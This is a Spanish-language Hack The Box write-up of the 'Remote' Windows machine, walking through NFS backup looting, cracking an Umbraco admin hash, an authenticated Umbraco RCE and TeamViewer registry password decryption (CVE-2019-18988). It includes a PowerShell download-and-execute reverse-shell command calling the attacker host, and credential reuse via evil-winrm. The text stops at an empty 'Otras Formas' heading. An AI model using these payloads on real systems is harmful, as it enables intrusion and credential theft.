---
layout: single
title: Remote - Hack The Box
excerpt: "Esta máquina es algo difícil, pues hay que investigar todos los servicios que usa y ver de cual nos podemos aprovechar para poder vulnerar los sistemas de la máquina, además de analizar los Exploits, estos se deben configurar correctamente para su uso."
date: 2023-01-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-remote/remote_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - FTP
  - Samba
  - SMB
  - Umbraco
  - Remote Code Execution (Authenticated)
  - NFS Pentesting
  - Reverse Shell
  - TeamViewer Enumeration & Exploitation
  - AES key Authentication - CVE-2019-18988
  - OSCP Style
---
![](/assets/images/htb-writeup-remote/remote_logo.png)

Esta máquina es algo difícil, pues hay que investigar todos los servicios que usa y ver de cual nos podemos aprovechar para poder vulnerar los sistemas de la máquina, además de analizar los Exploits, estos se deben configurar correctamente para su uso.

# Recopilación de Información
## Traza ICMP
Vamos a hacer un ping y analicemos el TTL para saber que SO utiliza la máquina:
```
ping -c 4 10.10.10.180                
PING 10.10.10.180 (10.10.10.180) 56(84) bytes of data.
64 bytes from 10.10.10.180: icmp_seq=1 ttl=127 time=129 ms
64 bytes from 10.10.10.180: icmp_seq=2 ttl=127 time=130 ms
64 bytes from 10.10.10.180: icmp_seq=3 ttl=127 time=134 ms
64 bytes from 10.10.10.180: icmp_seq=4 ttl=127 time=131 ms

--- 10.10.10.180 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3011ms
rtt min/avg/max/mdev = 128.920/130.771/134.012/1.957 ms
```
Con el TTL ya sabemos que es una máquina tipo Windows, realicemos los escaneos de puertos y servicios.

## Escaneo de Puertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.180             
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-25 15:54 CST
Initiating SYN Stealth Scan at 15:54
Scanning 10.10.10.180 [65535 ports]
Discovered open port 139/tcp on 10.10.10.180
Discovered open port 111/tcp on 10.10.10.180
Discovered open port 80/tcp on 10.10.10.180
Discovered open port 445/tcp on 10.10.10.180
Discovered open port 21/tcp on 10.10.10.180
Discovered open port 135/tcp on 10.10.10.180
Discovered open port 49666/tcp on 10.10.10.180
Discovered open port 49679/tcp on 10.10.10.180
Discovered open port 5985/tcp on 10.10.10.180
Discovered open port 2049/tcp on 10.10.10.180
Increasing send delay for 10.10.10.180 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 49667/tcp on 10.10.10.180
Increasing send delay for 10.10.10.180 from 5 to 10 due to max_successful_tryno increase to 5
Discovered open port 49665/tcp on 10.10.10.180
Increasing send delay for 10.10.10.180 from 10 to 20 due to max_successful_tryno increase to 6
Completed SYN Stealth Scan at 15:55, 82.41s elapsed (65535 total ports)
Nmap scan report for 10.10.10.180
Host is up, received user-set (1.7s latency).
Scanned at 2023-01-25 15:54:25 CST for 82s
Not shown: 34995 filtered tcp ports (no-response), 30528 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
111/tcp   open  rpcbind      syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
2049/tcp  open  nfs          syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49679/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 82.57 seconds
           Raw packets sent: 403278 (17.744MB) | Rcvd: 30857 (1.234MB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Damn! Demasiados puertos abiertos y ya vemos varios servicios conocidos como el FTP, el HTTP y le SMB o Samba. Pero hay algunos que no había visto, antes de investigarlos vamos a hacer un escaneo de servicios.

## Escaneo de Servicios
```
nmap -sC -sV -p21,80,111,135,139,445,2049,5985,49665,49666,49667,49679 10.10.10.180              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-25 15:57 CST
Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.00% done; ETC: 15:58 (0:00:00 remaining)
Nmap scan report for 10.10.10.180
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-25T21:58:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.34 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Como menciones antes, hay varios servicios que no había visto antes como el **mountd**, el **rpcbind** y el **NFS**. Es momento de investigar que son estos servicios.

## Investigación de Servicios
Primero vamos a investigar el **rpcbind** que esta en el puerto 111:

**El servicio rpcbind asigna los servicios de llamada a procedimiento remoto (RPC) a los puertos en los que escuchan. Los procesos RPC notifican a rpcbind cuando se inician, registrando los puertos en los que escuchan y los números de programa RPC que esperan servir.**

Ahora investiguemos sobre el servicio **mountd**:

**El daemon mountd gestiona solicitudes de montaje de sistema de archivos desde sistemas remotos y proporciona control de acceso. El daemon mountd comprueba /etc/dfs/sharetab para determinar qué sistemas de archivos están disponibles para el montaje remoto y qué sistemas están autorizados a hacer el montaje remoto.**

Y por último el **servicio NFS**:

**Network File System (NFS) es un estándar de servidor de archivos basado en el modelo cliente-servidor. El NFS permite a los usuarios ver, actualizar y almacenar archivos en un sistema remoto como si estuvieran trabajando localmente.**

Muy bien, pues después de leer cada concepto de los servicios, deduzco que la máquina pues es un servidor en sí, esto quiere decir que aquí se almacena todo lo que tenga que ver con la página web que esta activa en el puerto 80 e incluso el escaneo de servicios nos dice que los 3 operan en conjunto. Además, está el puerto 5985 que el escaneo nos muestra con el servicio HTTTPAPI, vamos a investigar este último:

![](/assets/images/htb-writeup-remote/Captura7.png)

Mmmm pues no es más que una API de Microsoft al parecer.

Antes de continuar e investigar la página web que está operando, veamos si no hay algún Exploit para los 4 servicios que ya investigamos, vamos a buscar por internet primero ya que no tenemos una versión en si de todos los servicios, si lo tuviéramos seria solamente buscar un Exploit con la herramienta **Searchsploit**.

# Análisis de Vulnerabilidades
## Buscando Vulnerabilidades para los Servicios Investigados
Encontramos una página bastante interesante y que al parecer nos puede ayudar de aquí en adelante para futuras máquinas, pues te da referencias de lo que puedes hacer, lo que no puedes y de lo que necesitar para vulnerar ciertos servicios:

Página HackTricks: 
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind

Ahí incluso hay una sección que nos dice que el **servicio RPCBIND** puede ser vulnerable para cargar archivos si está activo junto al **servicio NFS**.

Esto quizá nos sirva más adelante, pero de momento vamos a investigar la página web.

## Analizando Puerto 80
Vamos a entrar en la página web que esta activa y veamos que hay:

![](/assets/images/htb-writeup-remote/Captura1.png)

Al parecer es una tienda como de ropa, pero está incompleta. Veamos que nos dice **Wappalizer**:

![](/assets/images/htb-writeup-remote/Captura2.png)

Utilizan algunas librerías de JavaScript pero no veo algo que nos pueda servir, sigamos analizando la página web.

Hay una sección llamada **People**, quiza alguno de esos nombre sea un usuario asi que seria bueno anotarlos por si las dudas.

![](/assets/images/htb-writeup-remote/Captura3.png)

En la sección **About Us** hay algunas ideas de lo que pueden implementar en la página y hay una subrayada como si ya se hubiera hecho, no creo que nos sirva de mucho esto pero hay que tomar en cuenta eso que subrayaron.

![](/assets/images/htb-writeup-remote/Captura4.png)

Por último en la sección de **Contact** nos viene la opción de mandar un mensaje a Umbraco. ¿Pero qué pasa si le damos click?

![](/assets/images/htb-writeup-remote/Captura5.png)

Vaya, vaya, un inicio de sesión para el servicio Umbraco, hay que investigar este servicio.

![](/assets/images/htb-writeup-remote/Captura6.png)

## Investigando el Servicio Umbraco
Veamos que es el servicio Umbraco:

**Umbraco es una plataforma de gestión de contenidos open source utilizado para publicar contenido en la World Wide Web e intranets. Está desarrollado con C# y funciona sobre infraestructura Microsoft.**

Entonces Umbraco es un gestor de contenidos, ahuevo debe de haber credenciales por defecto, vamos a buscarlas:

**One installed, the default username and password for the backoffice is "admin" and "test"**

Probamos esto y nada, no sirve, entonces de momento vamos a dejar Umbraco hasta que tengamos una versión pues con esto podemos buscar un Exploit que nos sirva.

## Analisando Servicios FTP y Samba
Primero vamos con el FTP, ya que el escaneo de servicios nos menciona que podemos conectarnos como usuario **Anonymous** entonces veamos que hay dentro:
```
ftp 10.10.10.180
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49702|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> ls -la
229 Entering Extended Passive Mode (|||49703|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> exit 
221 Goodbye.

```
Nos conectamos y...nada, no nos muestra nada, quizá podamos ver si se pueden subir archivos. Probémoslo:
```
whoami > test.txt
```
Creamos un archivo .txt con el comando **whoami** para ver si se puede subir y ejecutar en el FTP, subamos el archivo:
```
ftp 10.10.10.180 
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49704|)
550 Access is denied. 
ftp> exit
221 Goodbye.
```
Nada, no tenemos permisos. Ahora veamos el servicio Samba, aunque no creo que podamos hacer mucho, ya que el escaneo no nos indicó que podamos loguearnos:
```
smbclient -L //10.10.10.180/ -N
session setup failed: NT_STATUS_ACCESS_DENIED
```
Nope, no pudimos meternos, entonces hay que cambiar la jugada y buscar la forma de vulnerar algún servicio. Intentemos usando la página **HackTricks**, ya que no busque nada sobre NFS.

## Investigando el Servicio NFS
Truco para **HackTricks**: Si usamos la palabra **Pentesting** y luego el servicio que buscamos, nos aparecerá mejores opciones para tratar de vulnerar dicho servicio.

Buscamos por la página **HackTricks** y encontramos lo siguiente:

![](/assets/images/htb-writeup-remote/Captura8.png)

Así que intentemos lo que nos dice, a ver que nos sale:
```
showmount -e 10.10.10.180      
Export list for 10.10.10.180:
/site_backups (everyone)

```
a...Mira nada más, cualquiera puede ver los backups...vamos a ver que hay ahí, pero antes, hay que preparar una carpeta porque según **HackTricks** podemos descargarlo:
```
mkdir /mnt/new_back
```
Se creo una carpeta llamada **new_back** en la carpeta **mnt** y si esta no existía pues también se crea, ahora vamos a descargar el backup que encontramos:
```
mount -t nfs [-o vers=2] 10.10.10.180:/site_backups /mnt/new_back -o nolock
zsh: bad pattern: [-o
```
Achis, no entiendo ese error, pero vamos a tumbar ese corchete para ver si aun así corre el comando:
```
mount -t nfs 10.10.10.180:/site_backups /mnt/new_back -o nolock 
```
Al parecer todo bien, es momento de ver que hay en ese backup:
```
cd /mnt/new_back
ls
App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views
```
Chale, se ve que hay muchos archivos y que hueva buscar en todos. Investiguemos en donde se almacena la base de datos de Umbraco:

Si ponemos en el navegador "Umbraco where is database" nos saldra una pagina del mismo servicio Umbraco y ahi viene varios lugares en donde se guarda:
*  /data/umbraco.config -> De manera local, lo cual no tenemos
* filesystem -> No lo veo por ahi
* /App_Data folder -> ESA SI ESTA!!!

Como ya vimos, hay que investigar esa carpeta, pero antes, aquí el link de Umbraco sobre donde se almacena la BD: 
* https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data

Ahora sí, veamos que hay en esa carpeta:
```
ls
cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf

```
Mira, ahí esta el **umbraco.config** que también almacena parte de la BD de Umbraco, pero tambien esta uno con extensión **.sdf**, pero primero vamos a ver el **.config**.

Mmmmm después de analizarlo rápidamente, no hay nada que nos pueda ayudar, salvo el nombre del creador de varios posts, que se llama **admin**, siento que o está incompleto o es un nombre por default que da Umbraco. Ahora veamos que es ese **.sdf**.

Por cierto, los **.sdf** son:
**Los archivos SDF se utilizan para almacenar bases de datos en un formato estructurado.**

Entonces lo que vamos a ver será una base de datos, no sería bueno usar el comando **cat** para ver que hay dentro porque no creo que lo muestre bien pues serian datos más no **strings** o texto en si:
```
file Umbraco.sdf      
Umbraco.sdf: data
```
Ahí está, son datos, entonces hay que convertirlos en **strings** para que se puedan leer y esto se hace de la sig. manera:
```
strings Umbraco.sdf > /Path_Donde_Quieras_Guardar_El_Output/output
```
Y ya con esto se guarda como tipo **string**, lo que nos permitirá ver con texto toda la BD.

## Analizando el Archivo .SDF
Solamente usamos el comando **cat** en el output para ver que hay dentro:
```
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
@{pv
qpkaj
dAc0^A\pW
(1&a$
"q!Q
umbracoDomains
domainDefaultLanguage
```
Mira nada más, ya tenemos dos usuarios y tenemos un hash que supongo es una contraseña, vamos a tratar de averiguar que es ese hash.

Podríamos usar la herramienta **John** o **hashID** pero vamos a usar cualquiera que nos suelte internet:

![](/assets/images/htb-writeup-remote/Captura12.png)

Aquí el link de esta página: 
* https://hashes.com/es/decrypt/hash

La contraseña es: **baconandcheese**

Una vez ya tenemos la contraseña y como tenemos 2 usuarios, probemos en Umbraco el usuario que estaba junto al hash.

![](/assets/images/htb-writeup-remote/Captura9.png)

Y ya estamos dentro!

![](/assets/images/htb-writeup-remote/Captura10.png)

Ya tenemos la versión que usa **Umbraco**, ahora podemos buscar un Exploit:

![](/assets/images/htb-writeup-remote/Captura11.png)

# Explotación de Vulnerabilidades
Usamos **Searchsploit** para buscar el Exploit e incluso podemos buscar por internet:
```
searchsploit umbraco 7.12.4                                                                                    
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                 | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                 | aspx/webapps/49488.py
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

### Probando Exploit: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution
Vamos a usar el primero, aunque al parecer ambos son lo mismo:
```
searchsploit -m aspx/webapps/46153.py
  Exploit: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46153
     Path: /usr/share/exploitdb/exploits/aspx/webapps/46153.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/berserkwings/Escritorio/HTB/Retired_Easy_machines/Remote/OSCP_Style/MiManera/46153.py
```
Le cambiamos el nombre:
```
mv 46153.py Umbraco_Exploit.py
```
Y lo analizamos de arriba hacia abajo:
```
{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\

login = "";
password="";
host = "";
```
Como se observa, nos pide 3 datos que ya tenemos y además esta esa parte del código en donde al parecer podemos inyectar algún comando como el Exploit que usamos en la máquina **Bounty Hunter**, vamos a llenar los datos que nos pide y vamos a probar con una **Traza ICMP*** para ver si funciona el Exploit:
```
{ string cmd = "/c ping 10.10.14.9"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\

login = "admin@htb.local";
password="baconandcheese";
host = "http://10.10.10.180";
```
Levantamos un servidor que acepte la **Traza ICMP** con **tcpdump**:
```
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```
Y activamos el Exploit:
```
python Umbraco_Exploit.py
Start
[]
End
```
Resultado:
```
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:59:56.827476 IP 10.10.10.180 > 10.10.14.9: ICMP echo request, id 1, seq 1, length 40
18:59:56.827492 IP 10.10.14.9 > 10.10.10.180: ICMP echo reply, id 1, seq 1, length 40
18:59:57.834902 IP 10.10.10.180 > 10.10.14.9: ICMP echo request, id 1, seq 2, length 40
18:59:57.834914 IP 10.10.14.9 > 10.10.10.180: ICMP echo reply, id 1, seq 2, length 40
18:59:58.851255 IP 10.10.10.180 > 10.10.14.9: ICMP echo request, id 1, seq 3, length 40
18:59:58.851266 IP 10.10.14.9 > 10.10.10.180: ICMP echo reply, id 1, seq 3, length 40
18:59:59.866337 IP 10.10.10.180 > 10.10.14.9: ICMP echo request, id 1, seq 4, length 40
18:59:59.866347 IP 10.10.14.9 > 10.10.10.180: ICMP echo reply, id 1, seq 4, length 40
^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```
Esto quiere decir que, si funciona dicho Exploit, ¿pero ahora que hacemos? Bueno, investigue como usar este Exploit y justo aparece una página que explica que hacer a continuación, aqui la página: 
* https://vk9-sec.com/umbraco-cms-7-12-4-authenticated-remote-code-execution/

Entonces vamos a crear una **Powershell Reverse Shell** para conectarnos de manera remota a la máquina que usa Umbraco, entonces vamos por pasos como indica la página:
* Descargamos el repo **Nishang** para usar la shell que necesitamos: https://github.com/samratashok/nishang
```
git clone https://github.com/samratashok/nishang.git                                        
Clonando en 'nishang'...
remote: Enumerating objects: 1705, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 1705 (delta 5), reused 4 (delta 1), pack-reused 1691
Recibiendo objetos: 100% (1705/1705), 10.89 MiB | 10.43 MiB/s, listo.
Resolviendo deltas: 100% (1064/1064), listo.
```
* Copiamos la siguiente shell que esta en la carpeta "Shells": **Invoke-PowerShellTcp.ps1**

```
cd nishang/shells
cp Invoke-PowerShellTcp.ps1 path_donde_quieras_que_se_guarde/.
```
* Entramos a la shell y agregamos la siguiente linea al final: Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

```
{
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress TuIP -Port PuertoQueQuieras
```
* Modificamos el Exploit para que cargue la **Reverse Shell**:
```
{ string cmd = "/c powershell IEX(New-Object Net.WebClient).downloadString(\'http://10.10.14.9/Invoke-PowerShellTcp.ps1\')"; System.Diagnost>
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
```
* Activamos una netcat:
```
nc -nvlp 443                                        
listening on [any] 443 ...
```
* Activamos un servidor en Python para que la máquina descargue el Exploit:
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
* Activamos el Exploit y vemos el resultado:

```
nc -nvlp 443                                        
listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.180] 49736
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
```
Incluso si vemos el servidor en Python, veremos cómo se descargó y está activo pues si lo quitamos, se quita todo:
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.180 - - [26/Mar/2023 20:15:53] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
127.0.0.1 - - [26/Mar/2023 22:05:25] "GET / HTTP/1.1" 200 -
```
Bien ya estamos dentro, ahora es cosa de buscar la flag del usuario y listo.

# Post Explotación
¿Ahora que hacemos? Bien, es hora de buscar que hay en la máquina. Investigamos en varios lados, pero hay algo interesante en la carpeta de **Program Files (x86)** y es el servicio **TeamViewer**, pero ¿qué es esto?

**TeamViewer es un software para el acceso remoto, así como para el control y el soporte en remoto de ordenadores y otros dispositivos finales.​**

Si entramos en esa carpeta, nos dirá la versión que esta instalada de **TeamViewer**:
```
PS C:\Program Files (x86)> cd TeamViewer 
PS C:\Program Files (x86)\TeamViewer> dir


    Directory: C:\Program Files (x86)\TeamViewer


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/27/2020  10:35 AM                Version7
```
Ahora busquemos un Exploit:
```
searchsploit TeamViewer version7                                                                               
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```
No pues nada, busquemos el servicio nada más:
```
searchsploit TeamViewer         
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
TeamViewer 11 < 13 (Windows 10 x86) - Inline Hooking / Direct Memory Modification Permission Change        | windows_x86/local/43366.md
TeamViewer 11.0.65452 (x64) - Local Credentials Disclosure                                                 | windows_x86-64/local/40342.py
TeamViewer 5.0.8232 - Remote Buffer Overflow                                                               | windows/remote/34002.c
TeamViewer 5.0.8703 - 'dwmapi.dll' DLL Hijacking                                                           | windows/local/14734.c
TeamViewer App 13.0.100.0 - Denial of Service (PoC)                                                        | windows_x86-64/dos/45404.py
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
No creo que nos sirvan estos Exploits, mejor vamos a buscar por internet.

Encontré los siguientes links con datos de interés:
* https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat

En este link hay varias pruebas que podemos hacer dentro de la máquina para obtener las credenciales de Windows
```
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
```
Una vez usemos este comando, nos dará información muy útil que sera las credenciales pero encriptadas:
```
LastUpdateCheck    REG_DWORD    0x6250227f
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3
```
Lo que necesitamos es desencriptar dichas credenciales, aunque la que más nos interesa es la de **SecurityPasswordAES**. Para desencriptarlas, vamos a usar un script en Python que creo el usuario del siguiente link.

* https://whynotsecurity.com/blog/teamviewer/

Con leer el blog, vemos la aventura que se echó para descubrir como explotar las vulnerabilidades que se encontraron en el **TeamViewer Versión 7** y el cómo le haría para desencriptar dichas credenciales, incluso el siguiente link también explica todo esto pero ya resumido: https://kalilinuxtutorials.com/decryptteamviewer/

Pero nosotros vamos a ocupar esta versión: 
* https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0

Para usarlo es solo copiar el código en un archivo **.py** y tener instaladas los siguientes módulos de Python:
* hexdump
* pycryptodome

PERO, antes de instalar algo, analice un poco el script y no se para que usa **hexdump** así que lo quite y sirvió el script jeje.

Para instalar el pycryptomode hacemos lo siguiente:
```
pip3 install pycryptodome    
Collecting pycryptodome
  Downloading pycryptodome-3.17-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.1/2.1 MB 8.5 MB/s eta 0:00:00
Installing collected packages: pycryptodome
Successfully installed pycryptodome-3.17
```
Y ahora si ya podemos usar el Exploit y con solo activar el script, ya solo es pasarle el encriptado de **SecurityPasswordAES**:
```
python3 TeamViewer_Exploit.py

This is a quick and dirty Teamviewer password decrypter basis wonderful post by @whynotsecurity.
Read this blogpost if you haven't already : https://whynotsecurity.com/blog/teamviewer
 
Please check below mentioned registry values and enter its value manually without spaces.
"SecurityPasswordAES" OR "OptionsPasswordAES" OR "SecurityPasswordExported" OR "PermanentPassword"

Enter output from registry without spaces : FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
Decrypted password is :  !R3m0te!
```
Muy bien, ya tenemos la contraseña, es momento de checar si la clave función. Para esto, vamos a usar **Crackmapexec**:
```
crackmapexec smb 10.10.10.180 -u 'Administrator' -p '!R3m0te!'
SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
SMB         10.10.10.180    445    REMOTE           [+] remote\Administrator:!R3m0te! (Pwn3d!)
```
Y si funciona, vamos a conectarnos remotamente con la herramienta **Evil Winrm**:
```
evil-winrm -i 10.10.10.180 -u 'Administrator' -p '!R3m0te!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
remote\administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/26/2023   5:50 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```
Y ya, con esto obtenemos ambas flags y terminamos con esta máquina.

# Otras Formas
Para obtener acceso como root o NT Authority System en este caso, hay otras opciones que se pueden probar, aquí algunos:
